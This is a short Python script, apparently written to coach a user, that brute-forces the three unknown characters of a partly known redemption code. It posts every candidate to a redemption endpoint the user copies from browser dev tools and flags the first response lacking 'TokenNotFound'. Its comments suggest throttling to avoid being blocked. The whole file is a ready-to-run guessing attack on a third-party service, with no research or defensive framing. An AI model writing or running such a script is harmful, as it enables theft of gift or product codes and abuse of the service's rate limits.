import requests
import itertools
import time

# 1. SETUP - DO NOT CHANGE THESE UNLESS THE SITE CHANGES
chars = "BCDFGHJKMPQRTVWXYZ2346789"
url = "PASTE_YOUR_PREPAREREDEEM_URL_HERE"  # From your Headers tab

# YOUR TEMPLATE: qthxk-rykm9-jtgwq-9___p-9j47z
prefix = "qthxk-rykm9-jtgwq-9"
suffix = "p-9j47z"


def start_brute_force():
    print("Starting... Testing 15,625 possible combinations.")

    # Generate the 3-digit combinations
    combinations = itertools.product(chars, repeat=3)

    for count, combo in enumerate(combinations, 1):
        middle = "".join(combo)
        full_code = f"{prefix}{middle}{suffix}"

        # 2. PAYLOAD - Using the key name you found
        payload = {
            "tokenIdentifierValue": full_code
            # If there was an 'appId' in the payload tab, add it here:
            # "appId": "12345"
        }

        try:
            # We use json=payload to send it as a JSON object
            response = requests.post(url, json=payload)

            # 3. LOGIC - Check if it's NOT a failure
            if "TokenNotFound" not in response.text:
                print(f"\n[!!!] MATCH FOUND: {full_code}")
                print(f"Server Response: {response.text}")
                return

            # Progress printout
            if count % 250 == 0:
                print(f"Progress: {count}/15625 codes tested...")

            # Optional: Add a tiny sleep to avoid being blocked
            # time.sleep(0.1)

        except Exception as e:
            print(f"\nError at code {full_code}: {e}")
            time.sleep(2)  # Pause longer if the connection breaks
            continue


if __name__ == "__main__":
    start_brute_force()